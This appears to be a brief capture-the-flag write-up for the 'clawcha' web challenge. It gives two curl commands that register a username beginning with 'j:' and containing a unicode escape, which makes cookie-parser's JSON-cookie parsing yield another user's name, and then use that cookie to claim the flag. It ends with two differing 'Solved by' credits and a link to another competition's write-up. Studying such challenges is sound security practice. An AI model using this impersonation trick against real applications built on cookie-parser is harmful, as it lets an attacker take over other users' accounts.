# web - clawcha

```
# 1. Register with unicode-escaped username (JSON.parse turns \u0032 → '2' → r2uwu2)
curl -s -c cookies.txt -X POST "https://clawcha.chall.lac.tf/login" \
  -H 'Content-Type: application/json' \
  -d '{"username":"j:\"r2uwu\\u0032\"","password":"solve123"}'

# 2. Grab the flag
curl -s -b cookies.txt -X POST "https://clawcha.chall.lac.tf/claw" \
  -H 'Content-Type: application/json' \
  -d '{"item":"flag"}'
```
root cause: in `cookie-parser` , if a cookie value starts with` j:`, it will try to parse it as a JSON object
which then will run `JSONCookies()` on the result, turning` j:"r2uwu2"` into the string `r2uwu2`

https://github.com/HvAng10/HvAng10.github.io/blob/671069c436d3150eda9a00efd2fee7085e644bf8/2026/02/02/%E9%98%BF%E9%87%8CCTF-2026-WriteUp/index.html

Solved by vicevirus

Solved by: yappare